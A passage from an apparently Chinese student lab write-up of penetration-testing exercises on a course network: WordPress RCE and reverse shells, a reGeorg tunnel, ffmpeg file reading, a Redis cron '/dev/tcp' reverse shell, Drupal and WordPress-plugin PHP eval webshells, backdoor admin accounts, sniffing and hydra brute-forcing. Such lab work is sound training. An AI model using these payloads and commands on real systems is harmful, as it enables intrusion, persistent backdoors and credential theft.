利用shell上传regeorg的tunnel.php文件，使用regeorg架设代理。
通过proxychains设置好regeorg的代理，利用这个代理扫描内网1.0网段。</code></pre><p>1.查看漏洞利用脚本wordpress-rce-exploit.sh理解脚本改进的原理。填写漏洞利用脚本的关键信息如反弹IP，监听端口等。本地监听设置的端口获取反弹的shell。</p>
<p>修改脚本<code>wordpress-rce-exploit.sh</code>中的反弹ip：</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531122109568.png" alt="image-20200531122109568"></p>
<p>执行<code>wordpress-rce-exploit.sh</code>脚本</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531122418305.png" alt="image-20200531122418305"></p>
<p>此时，打开另一个shell 进行监听，如下图，可以看到我们获得了目标机<code>192.168.2.11</code>反弹的shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531122658397.png" alt="image-20200531122658397"></p>
<p>2.利用shell上传regeorg的tunnel.php文件，使用regeorg架设代理。</p>
<p>使用 <code>SimpleHTTPServer服务器</code> 开启一个服务器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8080</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531123013887.png" alt="image-20200531123013887"></p>
<p>上传 <code>tunnel.nosocker.php</code>至目标机<code>192.168.2.11</code>，在获得的目标机shell中输入命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /var/www/html/wordpress</span><br><span class="line">wget http://192.168.2.200:8080/tunnel.nosocket.php</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531124145004.png" alt="image-20200531124145004"></p>
<p>然后查看是否上传成功，如下图，成功响应</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl  http://192.168.2.11/tunnel.nosocket.php</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531124220274.png" alt="image-20200531124220274"></p>
<p>开启代理：</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531124430640.png" alt="image-20200531124430640"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /home/Hack/reGeorg-master</span><br><span class="line"><span class="meta">#</span><span class="bash">端口号是8080的话，需要把之前SimpleHTTPServer开启的服务器关掉，释放8080端口。或者用别的端口</span></span><br><span class="line">python reGeorgSocksProxy.py -p 8080 -u http://192.168.2.11/tunnel.nosocket.php</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531131350637.png" alt="image-20200531131350637"></p>
<p>4.通过proxychains设置好regeorg的代理，利用这个代理扫描内网1.0网段。</p>
<p>需要修改proxychains的本地端口8080</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/proxychains.conf</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531132004237.png" alt="image-20200531132004237"></p>
<p>扫描内网，都开放了80端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 192.168.1.11</span><br><span class="line">proxychains nmap -Pn -sT 192.168.1.10</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531130112446.png" alt="image-20200531130112446"></p>
<h3 id="实验结果提交-8"><a href="#实验结果提交-8" class="headerlink" title="实验结果提交"></a>实验结果提交</h3><p>提交目标home目录下文件中存在的flag{32位MD5} 字样的字符串作为实验结果提交，提交后该实验任务完成。</p>
<p><code>flag5{2591c98b70119fe624898b1e424b5e91}</code></p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531115503438.png" alt="image-20200531115503438"></p>
<h2 id="任务五、redis未授权访问-ffmpeg-任意文件读取"><a href="#任务五、redis未授权访问-ffmpeg-任意文件读取" class="headerlink" title="任务五、redis未授权访问+ffmpeg 任意文件读取"></a>任务五、redis未授权访问+ffmpeg 任意文件读取</h2><h3 id="【任务描述】-9"><a href="#【任务描述】-9" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务基于真实企业网络环境，在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p>
<pre><code>查看网页中的信息可知，是通过ffmpeg处理视频的小应用，只有上传，下载和删除功能，此处存在ffmpeg文件读取漏洞，构造特定的avi视频，经过ffmpeg处理之后的视频就会包含想要的文件内容。利用文件读取漏洞获取redis配置文件内容。
redis数据库服务，允许外连且没有设置密码，可以随意访问，此处存在未授权访问漏洞，正常情况下可以写入文件，但是过程中发现，必要的config命令被替换了。而config命令的替换一定是写在redis的配置文件中的，配置文件的路径又可以在redis中执行info获取到。在以上环境中获取到redis服务器的shell。</code></pre><p>通过完成本实验任务，要求学生掌握利用ffmpeg文件读取漏洞获取redis配置文件内容。掌握redis数据库未授权访问漏洞的常见利用流程、方法和技巧，为完成后续企业渗透实验任务奠定坚实的漏洞利用技术基础。</p>
<h3 id="实验目标-9"><a href="#实验目标-9" class="headerlink" title="实验目标"></a>实验目标</h3><pre><code>了解网络安全漏洞的概念以及现有的安全漏洞扫描工具。认知常见网络安全漏洞。
掌握ffmepg任意文件读取漏洞的利用方法。
了解redis数据库的特性和配置文件的使用。
掌握redis数据库未授权访问漏洞的利用方法。</code></pre><h3 id="实验工具-9"><a href="#实验工具-9" class="headerlink" title="实验工具"></a>实验工具</h3><ul>
<li>Firefox</li>
<li>ffmepg漏洞利用工具</li>
<li>redis-cli(redis的客户端)</li>
<li>proxychains</li>
</ul>
<h3 id="操作步骤-9"><a href="#操作步骤-9" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code>扫描目标开启的端口，发现web和redis服务
连接redis服务器查看配置文件位置
利用ffmepg的任意文件读取漏洞构造payload读取redis配置文件，获取修改过后的config命令。
利用redis写入文件的特点覆盖目标的定时任务cron文件反弹shell</code></pre><p>1.扫描目标开启的端口，发现web和redis服务。</p>
<p>在火狐上配置reGeorg的代理</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531130547251.png" alt="image-20200531130547251"></p>
<p>查看网址192.168.1.11</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531130818921.png" alt="image-20200531130818921"></p>
<p>2.连接redis服务器查看配置文件位置</p>
<p>连接 <code>redis</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains ./redis-cli -h 192.168.1.11</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531135809217.png" alt="image-20200531135809217"></p>
<p><code>info</code>查看配置信息</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531135859436.png" alt="image-20200531135859436"></p>
<p>可以看到配置文件的位置为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;redis&#x2F;63799.conf</span><br></pre></td></tr></table></figure>

<p>3.利用ffmepg的任意文件读取漏洞构造payload读取redis配置文件，获取修改过后的config命令。</p>
<p>生成新的exp.avi</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">运行脚本：</span><br><span class="line">python3 gen_xbin_avi.py file:///etc/passwd security.avi</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531144037233.png" alt="image-20200531144037233"></p>
<p>上传新建的avi</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531144012703.png" alt="image-20200531144012703"></p>
<p>下载得到 456.avi</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531144100505.png" alt="image-20200531144100505"></p>
<p>发现 <code>config</code> 命令被替换成了 <code>ccoonnffiigg</code></p>
<p>4.利用redis写入文件的特点覆盖目标的定时任务cron文件反弹shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">redis连接，通过计划任务反弹shell</span></span><br><span class="line">proxychains ./redis-cli -h 192.168.2.11</span><br><span class="line">ccoonnnffiigg set dir /var/spool/cron</span><br><span class="line">set xxx "\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.2.11/9999 0&amp;&gt;1\n\n"</span><br><span class="line">ccoonnnffiigg set dbfilename root</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531144133773.png" alt="image-20200531144133773"></p>
<p>输入以上信息，我们重新通过<code>wordpress-rce-exploit.sh</code>反弹shell，成功</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531140845019.png" alt="image-20200531140845019"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /home/flag/flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531144252773.png" alt="image-20200531144252773"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/redis/63799.conf</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531144308209.png" alt="image-20200531144308209"></p>
<h3 id="实验结果提交-9"><a href="#实验结果提交-9" class="headerlink" title="实验结果提交"></a>实验结果提交</h3><p>提交目标redis数据库配置文件中和home目录下存在的flag{32位MD5} 字样的字符串作为实验结果提交，提交后该实验任务完成。</p>
<p>提交两个flag：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">flag1&#123;7bed46c5c61c0ac625cebf8a9922cc48&#125;</span><br><span class="line">flag2&#123;86a1b907d54bf7010394bf316e183e67&#125;</span><br></pre></td></tr></table></figure>


<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531144453982.png" alt="image-20200531144453982"></p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531144503466.png" alt="image-20200531144503466"></p>
<h2 id="任务六、drupal8远程代码执行"><a href="#任务六、drupal8远程代码执行" class="headerlink" title="任务六、drupal8远程代码执行"></a>任务六、drupal8远程代码执行</h2><h3 id="【任务描述】-10"><a href="#【任务描述】-10" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务基于真实企业网络环境，在四台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p>
<pre><code>使用浏览器挂代理访问内网机器192.168.1.10。
利用drupal8的php反序列化漏洞向目标服务器写入webshell。
使用Cknife连接已经生成的webshell</code></pre><p>通过完成本实验任务，要求学生掌握通过浏览器挂代理访问内网的方法，利用drupal8 php反序列化漏洞的技术，以及使用Cknife通过代理直接访问内网webshell的方法，掌握内网渗透测试的流程、方法和技巧，为完成后续企业渗透实验任务奠定坚实的漏洞利用技术基础。</p>
<h3 id="实验目标-10"><a href="#实验目标-10" class="headerlink" title="实验目标"></a>实验目标</h3><pre><code>了解网络安全漏洞的概念以及现有的安全漏洞扫描工具。认知常见网络安全漏洞。
熟悉网站webshell的概念，理解上传webshell、获取webshell权限的意义和方法。
掌握webshell工具Cknife的基本使用，特别是设置代理的功能，查看上传文件，命令执行等功能的使用。
掌握在浏览器上配置代理的方法。
掌握利用drupal8的php反序列化漏洞的攻击方法和相关的技术原理。</code></pre><h3 id="实验工具-10"><a href="#实验工具-10" class="headerlink" title="实验工具"></a>实验工具</h3><ul>
<li>Cknife</li>
<li>firefox</li>
</ul>
<h3 id="操作步骤-10"><a href="#操作步骤-10" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code>使用浏览器结合proxychains用之前的代理访问内网中的drupal8的web应用。
弱口令登录目标网站后台
利用反序列化漏洞执行phpinfo 探测网站信息
利用反序列化漏洞写入webshell，并测试存在
用Cknife设置代理连接webshell获取网站的权限</code></pre><p>1.使用浏览器代理访问内网机器 192.168.1.10</p>
<p>设置代理</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531130547251.png" alt="image-20200531130547251"></p>
<p>访问192.168.1.10的网站Drupal</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531132841730.png" alt="image-20200531132841730"></p>
<p>2.利用drupal8的php反序列化漏洞向目标服务器写入webshell</p>
<p>弱口令爆破，得到<code>admin：admin</code></p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531133021046.png" alt="image-20200531133021046"></p>
<p>访问 <a href="http://192.168.1.10/admin/config/development/configurations/single/import" target="_blank" rel="noopener">http://192.168.1.10/admin/config/development/configurations/single/import</a></p>
<p>导入 <code>drupal_exp.txt</code> （在<code>/home/hack</code>中）中的内容</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531134051193.png" alt="image-20200531134051193"></p>
<p>导入后，如下</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531134057805.png" alt="image-20200531134057805"></p>
<p>上一步导入之后，exp漏洞，在网站根目录生成了 <code>shell.php</code></p>
<p>访问192.168.1.10/shell.php</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531134140745.png" alt="image-20200531134140745"></p>
<p>打开Cknife 进行连接</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531134308828.png" alt="image-20200531134308828"></p>
<p>右键，添加链接</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531134713140.png" alt="image-20200531134713140"></p>
<p>设置代理地址</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531134727706.png" alt="image-20200531134727706"></p>
<p>双击添加的链接开启文件管理，如下</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531134801491.png" alt="image-20200531134801491"></p>
<p><strong>第一个flag</strong></p>
<p>flag12{c2ce1971e3a10498a64da8c7f3a70091}</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531135104806.png" alt="image-20200531135104806"></p>
<p><strong>第二个flag</strong></p>
<p>flag8{d969246731846291b32cd819bf0e7ff6}</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531134643563.png" alt="image-20200531134643563"></p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531144827002.png" alt="image-20200531144827002"></p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531144824548.png" alt="image-20200531144824548"></p>
<h3 id="实验结果提交-10"><a href="#实验结果提交-10" class="headerlink" title="实验结果提交"></a>实验结果提交</h3><p>提交目标home目录下和网站根目录下存在的flag{32位MD5} 字样的字符串作为实验结果提交，提交后该实验任务完成。</p>
<p>可以获得flag12</p>
<h1 id="综合实验"><a href="#综合实验" class="headerlink" title="综合实验"></a>综合实验</h1><h2 id="任务一"><a href="#任务一" class="headerlink" title="任务一"></a>任务一</h2><h3 id="【【任务描述】】"><a href="#【【任务描述】】" class="headerlink" title="【【任务描述】】"></a>【【任务描述】】</h3><pre><code>企业系统管理服务器192.168.1.3定时自动登陆内部ftp服务器下载文件。
操作机通过wireshark分析root目录下的cap包，发现网络中192.168.1.4提供ftp服务，操作机通过ettercap嗅探192.168.1.4的网络信息，获取ftp帐号和密码,通过ftp帐号密码登陆ftp服务器获取key.txt文件内容。提交key.txt中的内容。
操作机根据嗅探192.168.1.4和pcap文件的分析发现192.168.1.4还存在tcp 7001(weblogic)的服务, 利用weblogic服务的java反序列化漏洞,使用脚本执行系统命令获取key1.txt文件路径。提交key1.txt文件</code></pre><h3 id="【实验目标】"><a href="#【实验目标】" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><pre><code>掌握wireshark数据包抓取、分析
掌握利用ettercap进行密码嗅探
了解weblogic的Java反序列化漏洞的利用</code></pre><h3 id="【实验工具】"><a href="#【实验工具】" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><ul>
<li>wireshark</li>
<li>ettercap</li>
<li>ftp</li>
<li>weblogic</li>
</ul>
<h3 id="【操作步骤】"><a href="#【操作步骤】" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><p>1.1 分析root下的数据包获取网络中存在FTP、weblogic服务</p>
<p>打开wireshark</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531233517460.png" alt="image-20200531233517460"></p>
<p>打开test.cap，这是本次实验的数据</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531233607663.png" alt="image-20200531233607663"></p>
<p>抓包发现，192.168.1.3和192.168.1.4之前存在频繁的FTP联系</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531233522827.png" alt="image-20200531233522827"></p>
<p>1.2 使用ettercap工具嗅探FTP帐号密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ettercap</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531234658559.png" alt="image-20200531234658559"></p>
<p>1.3 登陆FTP服务器，获取key.txt文件内容</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531235258831.png" alt="image-20200531235258831"></p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531235223087.png" alt="image-20200531235223087"></p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531235246166.png" alt="image-20200531235246166"></p>
<p>1.4 利用weblogic服务的Java反序列化漏洞获取webshell权限</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531235426274.png" alt="image-20200531235426274"></p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531235552064.png" alt="image-20200531235552064"></p>
<p>1.5 利用webshell获取系统中key1.txt文件内容</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531235546690.png" alt="image-20200531235546690"></p>
<h3 id="【结果提交】"><a href="#【结果提交】" class="headerlink" title="【结果提交】"></a>【结果提交】</h3><p>1、提交key.txt文件内容</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531235623475.png" alt="image-20200531235623475"></p>
<p>2、提交key1.txt文件内容</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531235636585.png" alt="image-20200531235636585"></p>
<h2 id="任务二"><a href="#任务二" class="headerlink" title="任务二"></a>任务二</h2><h3 id="【【任务描述】】-1"><a href="#【【任务描述】】-1" class="headerlink" title="【【任务描述】】"></a>【【任务描述】】</h3><pre><code>操作机通过分析root目录下的test2.cap文件发现192.168.1.5的服务器有web服务，并且运行了wordpress站点。访问该网站，得到网站根目录的文件key2.txt。
利用Wordpress命令执行漏洞获取192.168.1.5服务器操作系统控制权，远程创建用户，修改系统管理员密码为xipu.123，远程登陆192.168.1.5后获取C盘下的username.txt</code></pre><h3 id="【【任务目标】】"><a href="#【【任务目标】】" class="headerlink" title="【【任务目标】】"></a>【【任务目标】】</h3><pre><code>获取key2.txt以及username.txt文件的值
了解Wordpress的命令执行漏洞的利用
学会使用菜刀工具，了解如何利用上传webshell获取后台权限</code></pre><h3 id="【实验工具】-1"><a href="#【实验工具】-1" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><ul>
<li>wireshark</li>
<li>cknife</li>
<li>rdesktop</li>
<li>wordpress<h3 id="【操作步骤】-1"><a href="#【操作步骤】-1" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3></li>
</ul>
<p>1.1 继续分析root下的其它数据包</p>
<p>操作机通过分析root目录下的test2.cap文件发现192.168.1.5的服务器有web服务，并且运行了wordpress站点。</p>
<p>1.2 获取网站目录下的key2.txt文件</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200601000612164.png" alt="image-20200601000612164"></p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200601000618012.png" alt="image-20200601000618012"></p>
<p>1.3 利用wordpress后台上传木马文件获取系统权限</p>
<p>这个flag是后台的密码，当然我们也可以通过brupsuite来进行爆破</p>
<p>从<a href="https://wordpress.org/plugins/simple-shortcode-block/上下载wordpress的主题插件" target="_blank" rel="noopener">https://wordpress.org/plugins/simple-shortcode-block/上下载wordpress的主题插件</a></p>
<p>编辑其中的index.php为一句话木马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[cmd]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200601132527118.png" alt="image-20200601132527118"></p>
<p>打开本地自己的机器（因为虚拟机不能连接外网）xshell直接拖拽上传我们下载的wordpress插件</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200601130232845.png" alt="image-20200601130232845"></p>
<p>登陆wordpress后台    (用户名admin，密码admin888)</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200601131146049.png" alt="image-20200601131146049"></p>
<p>上传插件</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200601131248314.png" alt="image-20200601131248314"></p>
<p>启动插件</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200601131348817.png" alt="image-20200601131348817"></p>
<p>Cknife连接如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.5/wordpress/wp-content/plugins/simple-shortcode-block/index.php</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200601132344491.png" alt="image-20200601132344491"></p>
<p>右键进入shell即可，可以看到，我们是管理员</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200601132813724.png" alt="image-20200601132813724"></p>
<p>1.4 远程创建用户，修改系统管理员密码为xipu.123，远程登陆192.168.1.5后获取C盘下的username.txt</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net user hacker Beijing123 /add</span><br><span class="line">net localgroup administrators hacker /add</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200601132926969.png" alt="image-20200601132926969"></p>
<p>修改管理员Aministrator密码为xipu.123</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net user  #可以看到电脑账所有账户的信息，并且包括管理员帐户</span><br><span class="line"><span class="meta">#</span><span class="bash">net user username newpass <span class="comment">#username为相关帐户的名称，newpass要使用的新密码</span></span></span><br><span class="line">net user Aministrator xipu.123 #username为相关帐户的名称，newpass要使用的新密码</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200601135050487.png" alt="image-20200601135050487"></p>
<p>1.5 使用rdesktop远程登陆，获取C盘下的username.txt文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rdesktop 16 192.168.1.5</span><br><span class="line">以Aministrator的身份登陆（上面已经修改其密码为xipu.123）</span><br></pre></td></tr></table></figure>

<p>远程登陆后，在c盘根目录下，获取username.txt文件夹</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200601135331588.png" alt="image-20200601135331588"></p>
<p>（也可以通过Cknife直接下载~~）</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200601135638241.png" alt="image-20200601135638241"></p>
<h3 id="【提交结果】"><a href="#【提交结果】" class="headerlink" title="【提交结果】"></a>【提交结果】</h3><p>1、提交key2.txt文件内容</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200601121648518.png" alt="image-20200601121648518"></p>
<p>2、提交username.txt文件内容中的IP地址</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200601121653866.png" alt="image-20200601121653866"></p>
<h2 id="任务三：使用Hydra暴力破解-nmap扫描服务"><a href="#任务三：使用Hydra暴力破解-nmap扫描服务" class="headerlink" title="任务三：使用Hydra暴力破解,nmap扫描服务"></a>任务三：使用Hydra暴力破解,nmap扫描服务</h2><h3 id="【【任务描述】】-2"><a href="#【【任务描述】】-2" class="headerlink" title="【【任务描述】】"></a>【【任务描述】】</h3><pre><code>通过任务二中username.txt文件内容，知道192.168.1.6服务器登录的用户名为root,密码为hacker***，*使用Hydra工具对192.168.1.6服务器进行ssh暴力破解。
远程桌面登录到192.168.1.6服务器，发现192.168.1.6服务器有2个网卡，通过nmap扫描发现存在192.168.2.3网站服务器。
获取192.168.1.6服务器根目录下的key3.txt文件*</code></pre><h3 id="【【任务目标】】-1"><a href="#【【任务目标】】-1" class="headerlink" title="【【任务目标】】"></a>【【任务目标】】</h3><pre><code>熟悉Linux下密码字典生成工具crunch、暴力破解工具hydra的使用方法
通过暴力破解工具获取服务器登录密码
获取服务器目录下的Introductions.txt文件内容</code></pre><h3 id="【实验工具】-2"><a href="#【实验工具】-2" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><ul>
<li>crunch</li>
<li>hydra</li>
<li>nmap</li>
</ul>
<h3 id="【操作步骤】-2"><a href="#【操作步骤】-2" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><p>1.1 生成爆破密码字典，爆破目标主机密码，提交爆破密码</p>
<p>crunch生成密码字典</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crunch 9 9 -o /home/password.txt -t hacker%%%</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200601122926212.png" alt="image-20200601122926212"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> -l指定某个用户名，-L可以指定一个用户名文件进行破解；-P指定密码文件破解，-p指定某个密码破解；192.168.3.119是要破解的主机地址；ssh是要破解的协议</span></span><br><span class="line">hydra -l root -P /home/password.txt 192.168.1.6 ssh</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200601123204270.png" alt="image-20200601123204270"></p>
<p>找到了密码是hacker427</p>
<p>1.2 登陆目标机，扫描网络内主机、服务</p>
<p>登陆</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.1.6</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200601123539876.png" alt="image-20200601123539876"></p>
<p>ifconifg发现两块网卡</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200601123747855.png" alt="image-20200601123747855"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.2.0/24</span><br></pre></td></tr></table></figure>



<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200601123941863.png" alt="image-20200601123941863"></p>
<p>1.3 获取根分区key3.txt文件</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200601124317975.png" alt="image-20200601124317975"></p>
<h3 id="【提交结果】-1"><a href="#【提交结果】-1" class="headerlink" title="【提交结果】"></a>【提交结果】</h3><p>1、提交爆破密码</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200601124051865.png" alt="image-20200601124051865"></p>
<p>2、提交key3.txt文件内容</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200601124333939.png" alt="image-20200601124333939"></p>
<h2 id="任务四"><a href="#任务四" class="headerlink" title="任务四"></a>任务四</h2><h3 id="【【任务描述】】-3"><a href="#【【任务描述】】-3" class="headerlink" title="【【任务描述】】"></a>【【任务描述】】</h3><p>1、获取192.168.1.4的ftp目录中的openvpn安装包，下载安装包并在192.168.1.6上搭建vpn服务器，提供VPN服务。<br>2、使用安装包中的openvpn.exe文件在192.168.1.5服务器搭建vpn客户端，拔号连接192.168.1.6上的vpn服务，通过VPN分配的IP地址nat后正常访问2.3的网站,可获取网站目录下的key04.txt<br>3、在192.168.1.5访问192.168.2.3网站发现其存在sql注入漏洞，获取192.168.2.3的webshell权限<br>4、通过webshell获取服务器根目录下的key4.txt文件</p>
<h3 id="【【任务目标】】-2"><a href="#【【任务目标】】-2" class="headerlink" title="【【任务目标】】"></a>【【任务目标】】</h3><p>1、掌握VPN服务端的安装配置、Windows客户端的安装配置及vpn连接<br>2、了解网络扫描工具nmap的使用<br>3、熟悉网站目录扫描工具wwwscan以及代理、爆破工具burpsuite的使用<br>4、了解如何利用SQL注入漏洞</p>
<h3 id="【实验工具】-3"><a href="#【实验工具】-3" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><ul>
<li>openvpn</li>
<li>scp</li>
<li>wwwscan</li>
<li>burpsuite</li>
<li>中国菜刀</li>
</ul>
<h3 id="【操作步骤】-3"><a href="#【操作步骤】-3" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><p>1.1 192.168.1.6部署部署VPN服务</p>
<p>本机从192.168.1.4上下载openvpn.zip包</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200611181234887.png" alt="image-20200611181234887"></p>
<p>利用scp传到192.168.1.6的主目录下，为192.168.1.6安装openvpn。复制配置文件<code>/usr/share/doc/openvpn-2.4.4/sample/sample-config-files/server.conf</code>到<code>/etc/openvpn/</code>下</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200611181337466.png" alt="image-20200611181337466"></p>
